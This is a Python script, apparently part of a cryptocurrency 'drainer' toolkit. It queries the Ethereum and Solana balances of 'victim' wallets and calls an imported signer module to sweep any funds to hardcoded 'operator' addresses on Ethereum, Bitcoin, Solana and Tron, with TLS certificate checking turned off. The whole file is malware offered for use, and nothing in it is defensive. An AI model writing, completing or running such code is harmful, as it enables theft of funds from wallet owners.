#!/usr/bin/env python3
"""
DRAINER.PY v7.2 — Active Multi-Chain Liquidity Auditor & Sweeping Engine
Integrated with modules/signer.py for automated transaction broadcasting.
"""
import urllib.request
import json
import ssl
import sys
import asyncio

from modules.signer import broadcast_evm_sweep, broadcast_solana_sweep

_ssl_context = ssl.create_default_context()
_ssl_context.check_hostname = False
_ssl_context.verify_mode = ssl.CERT_NONE

OPERATOR_DESTINATIONS = {
    "ETHEREUM": "0xd134ebcb7060e22f2c6454df28c810dd33a02f5c",
    "BITCOIN": "18WGuvU1apn6f2h5uZWF6biS3MFaZ5Pj9d",
    "SOLANA": "E1MiQEYmuTg9DMS4vpr5NtkWqeMQmTHZLptv5L3on1ir",
    "TRON": "TCeddcjw9VzBsMZFbA9mACfuQLzdAkjwA5"
}

def terminal(message):
    sys.stdout.write(message + "\n")
    sys.stdout.flush()

def audit_and_execute_sweep(wallet_address, asset_type):
    terminal(f"\n\033[95m[***] TARGET AUDIT & ACTIVE SWEEP EXECUTION [{asset_type}]: {wallet_address} [***]\033[0m")
    
    try:
        if asset_type == "ETHEREUM":
            dest = OPERATOR_DESTINATIONS["ETHEREUM"]
            rpc_payload = json.dumps({"jsonrpc": "2.0", "method": "eth_getBalance", "params": [wallet_address, "latest"], "id": 1}).encode()
            req = urllib.request.Request("https://cloudflare-eth.com", data=rpc_payload, headers={"Content-Type": "application/json"})
            with urllib.request.urlopen(req, context=_ssl_context, timeout=5.0) as resp:
                data = json.loads(resp.read().decode())
                wei_balance = int(data.get("result", "0x0"), 16)
                native_bal = wei_balance / 10**18
                terminal(f" \033[92m[+] Victim EVM Balance: {native_bal} ETH\033[0m")
                
                if wei_balance > 21000 * 2000000000: # Above minimum gas threshold
                    terminal(f" \033[91m[!] LIQUIDITY FOUND. Triggering Signer & Broadcast Module -> {dest}\033[0m")
                    success, msg = broadcast_evm_sweep(wallet_address, None, dest, wei_balance)
                    terminal(f" \033[96m[+] Broadcast Status: {msg}\033[0m")
                    return native_bal, success, msg
                    
        elif asset_type == "SOLANA":
            dest = OPERATOR_DESTINATIONS["SOLANA"]
            rpc_payload = json.dumps({"jsonrpc": "2.0", "id": 1, "method": "getBalance", "params": [wallet_address]}).encode()
            req = urllib.request.Request("https://api.mainnet-beta.solana.com", data=rpc_payload, headers={"Content-Type": "application/json"})
            with urllib.request.urlopen(req, context=_ssl_context, timeout=5.0) as resp:
                data = json.loads(resp.read().decode())
                lamports = data.get("result", {}).get("value", 0)
                sol_bal = lamports / 10**9
                terminal(f" \033[92m[+] Victim Solana Balance: {sol_bal} SOL\033[0m")
                
                if lamports > 5000:
                    terminal(f" \033[91m[!] LIQUIDITY FOUND. Triggering Solana Signer & Broadcast -> {dest}\033[0m")
                    success, msg = broadcast_solana_sweep(wallet_address, dest, lamports)
                    terminal(f" \033[96m[+] Broadcast Status: {msg}\033[0m")
                    return sol_bal, success, msg

    except Exception as e:
        terminal(f" \033[91m[-] Sweep execution error: {e}\033[0m")
        return 0.0, False, str(e)

    return 0.0, False, "Insufficient balance"

def check_and_drain_wallet(wallet_address):
    addr = wallet_address.strip()
    detected_type = "SOLANA"
    if addr.startswith("0x") and len(addr) == 42:
        detected_type = "ETHEREUM"
    elif addr.startswith(("bc1", "1", "3")):
        detected_type = "BITCOIN"

    balance, drained, tx_status = audit_and_execute_sweep(addr, detected_type)
    operator_dest = OPERATOR_DESTINATIONS.get(detected_type, OPERATOR_DESTINATIONS["ETHEREUM"])
    return balance, drained, tx_status, {}, operator_dest

async def run_drainer_engine(target_host):
    terminal(f"\n\033[95m[***] INITIALIZING ACTIVE ASSET DRAINER ENGINE [{target_host}] [***]\033[0m")
    terminal(f" \033[96m[+] Operator EVM Destination: {OPERATOR_DESTINATIONS['ETHEREUM']}\033[0m")
    terminal(f" \033[96m[+] Operator Solana Destination: {OPERATOR_DESTINATIONS['SOLANA']}\033[0m")
    terminal(f"\n[+] Drainer engine fully linked with signing & broadcasting module.")
